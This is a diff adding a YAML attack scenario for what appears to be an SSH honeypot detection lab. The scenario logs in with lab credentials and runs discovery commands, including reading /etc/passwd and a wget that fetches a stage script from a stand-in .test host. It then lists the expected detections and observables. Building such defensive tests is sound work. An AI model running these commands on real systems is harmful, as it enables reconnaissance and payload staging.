@@ -1,0 +1,18 @@
+id: ssh-discovery-download
+description: >
+  Log in to the SSH decoy, run a few discovery commands, then try to
+  download a script. The URL uses the reserved .test domain.
+# Uses the lab account from config.example.yaml so it works in both SSH auth modes.
+kind: attack
+steps:
+  - ssh:
+      user: labuser
+      password: lab-password-1
+      commands: [whoami, "uname -a", "cat /etc/passwd", "cd /tmp; wget http://payload.example.test/stage.sh"]
+expect:
+  detections: [HLAB-SSH-001, HLAB-SSH-002]
+  forbidden: [HLAB-AUTH-002, HLAB-AUTH-003]
+  observables:
+    - {type: url, value: "http://payload.example.test/stage.sh"}
+    - {type: domain, value: payload.example.test}
+  min_events: 7
